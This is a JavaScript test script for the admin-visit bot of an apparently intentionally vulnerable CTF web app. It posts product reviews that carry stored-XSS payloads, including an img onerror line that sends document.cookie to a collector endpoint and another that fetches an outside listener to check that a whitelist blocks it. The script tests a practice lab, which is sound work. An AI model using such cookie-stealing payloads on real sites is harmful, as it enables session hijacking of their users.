const http = require('http');
const io = require('socket.io-client');

async function request(method, path, body = null, token = null) {
  const headers = { 'Content-Type': 'application/json' };
  if (token) headers['Authorization'] = `Bearer ${token}`;

  try {
    const res = await fetch(`http://localhost:3000${path}`, {
      method,
      headers,
      body: body ? JSON.stringify(body) : undefined,
    });
    
    let data;
    try { data = await res.json(); } catch(e) { data = null; }
    
    return { status: res.status, data };
  } catch (err) {
    throw err;
  }
}

async function run() {
  console.log('--- BUGDROP BOT AUTOMATED TESTS ---');
  
  // Login first
  const loginRes = await request('POST', '/api/auth/login', { username: 'collector_42', password: 'bugdrop2024' });
  if (!loginRes.data || !loginRes.data.token) throw new Error('Could not login');
  const userToken = loginRes.data.token;
  
  // 1. GET /api/sys/status returns bot.available
  const statusRes = await request('GET', '/api/sys/status');
  if (statusRes.status !== 200) throw new Error('/sys/status failed');
  if (typeof statusRes.data.bot?.available !== 'boolean') {
    throw new Error('bot.available is not exposed');
  }
  console.log(`✅ bot.available is exposed: ${statusRes.data.bot.available}`);
  
  if (!statusRes.data.bot.available) {
    if (process.env.SKIP_BOT_TEST === '1') {
      console.log('⚠️  Playwright not available, skipping remaining tests (SKIP_BOT_TEST=1).');
      return;
    } else {
      throw new Error('Bot is not available. Playwright/Chromium must be installed, or run with SKIP_BOT_TEST=1');
    }
  }

  // 2. Fetch to localhost:9999 is aborted, but collector is logged.
  let listenerHit = false;
  const dummyServer = http.createServer((req, res) => {
    listenerHit = true;
    res.writeHead(200);
    res.end();
  });
  dummyServer.listen(9999, '127.0.0.1');

  const socketBot = io('http://localhost:3000');
  
  await new Promise((resolve, reject) => {
    let done = false;
    let collectorHit = false;
    
    const timeout = setTimeout(() => {
      if (!done) reject(new Error('Timeout waiting for Exfiltration alert'));
    }, 20000);
    
    socketBot.on('http-log', (log) => {
      if (log.threats && log.threats.some(t => t.tag === 'Exfiltration')) {
        collectorHit = true;
      }
      
      // Control positivo: si llega la alerta de Exfiltration, resolvemos
      if (collectorHit) {
        done = true;
        clearTimeout(timeout);
        resolve();
      }
    });

    socketBot.on('connect', async () => {
      // Review with external fetch
      await request('POST', '/api/products/1/reviews', {
        content: "<img src=x onerror='fetch(\"http://localhost:9999/x\")'>",
        rating: 5
      }, userToken);
      
      // Review with internal fetch (positive control)
      await request('POST', '/api/products/1/reviews', {
        content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=session=\"+document.cookie)'>",
        rating: 5
      }, userToken);
    });
  });

  socketBot.disconnect();
  dummyServer.close();
  
  if (listenerHit) throw new Error('External fetch was not aborted! Listener hit.');
  console.log('✅ Whitelist works: external fetch aborted, collector fetch succeeded.');

  
  // 3. 8 reviews in a burst
  console.log('Sending 8 burst reviews...');
  let maxRunning = 0;
  let maxQueued = 0;
  let maxDropped = 0;
  
  const pollInterval = setInterval(async () => {
    try {
      const st = await request('GET', '/api/sys/status');
      if (st.data?.bot) {
        maxRunning = Math.max(maxRunning, st.data.bot.running);
        maxQueued = Math.max(maxQueued, st.data.bot.queued);
        maxDropped = Math.max(maxDropped, st.data.bot.dropped);
      }
    } catch(e) {}
  }, 100);

  const burstPromises = [];
  for(let i=0; i<8; i++) {
    burstPromises.push(request('POST', '/api/products/1/reviews', {
      content: `<img src=x onerror='console.log(${i})'>`,
      rating: 5
    }, userToken));
  }
  
  await Promise.allSettled(burstPromises);
  await new Promise(r => setTimeout(r, 1000)); // wait a bit for queue to settle and dropped to register
  clearInterval(pollInterval);
  
  // Update dropped one last time just in case it dropped after the last interval
  const finalSt = await request('GET', '/api/sys/status');
  if (finalSt.data?.bot) {
    maxDropped = Math.max(maxDropped, finalSt.data.bot.dropped);
  }

  console.log(`Bot stats during burst: maxRunning=${maxRunning}, maxQueued=${maxQueued}, finalDropped=${maxDropped}`);
  
  if (maxRunning > 1) throw new Error(`Too many running simultaneously: ${maxRunning}`);
  if (maxQueued > 3) throw new Error(`Too many queued simultaneously: ${maxQueued}`);
  if (maxDropped < 1) throw new Error(`No visits dropped (should be >= 1): finalDropped=${maxDropped}`);
  
  console.log('✅ Queue concurrency and limits respected.');
  console.log('--- ALL BOT TESTS COMPLETED ---');

}

run().then(() => {
  process.exit(0);
}).catch(err => {
  console.error('❌ Bot test failed:', err);
  process.exit(1);
});
